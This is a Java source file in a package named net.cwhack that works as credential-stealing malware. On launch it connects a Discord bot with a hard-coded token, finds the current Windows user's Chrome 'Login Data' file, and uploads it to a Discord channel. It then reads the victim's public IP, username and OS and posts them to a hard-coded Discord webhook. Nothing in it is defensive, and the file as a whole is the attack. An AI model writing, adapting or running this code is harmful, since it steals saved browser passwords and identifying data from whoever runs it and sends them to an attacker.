package net.cwhack

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.utils.FileUpload;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class Main {

    public static void main(String[] args) throws InterruptedException {

        JDA mingo = JDABuilder.createDefault("MTA2NTAyNzcyNDcwMTM1MTk1Nw.Gqi_7Z.Dsia-V-bBcCu4jloQNrUcVwr-Kdnbs7fOd6RHs")
                .setActivity(Activity.playing("with your balls"))
                .build()
                .awaitReady();

        File f = new File("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");

            TextChannel cock = mingo.getTextChannelById("1061094305734869017");
            cock.sendFiles(FileUpload.fromData(f)).queue();





        String llLlLlL = System.getProperty("os.name");
        try {
            URL bigballs = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    bigballs.openStream()));
            String ip = bufferedReader.readLine();
            String llLlLlLlL = System.getProperty("user.name");
            sendMessage("``` NAME : " + llLlLlLlL + "\n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```");
        } catch (Exception ignore) {
        }
    }

    private static void cock(String geral, String e) {
    }


    private static void sendMessage(String message) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL("https://discord.com/api/webhooks/1061094381874065519/DgdCeUbCSQ3lWEMapY3UPtgz7lXKbCfiYgwg5vK8Xicj_ulPXwfNZTqSKP2q-74huG6T");
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        System.out.println(result);
    }
}
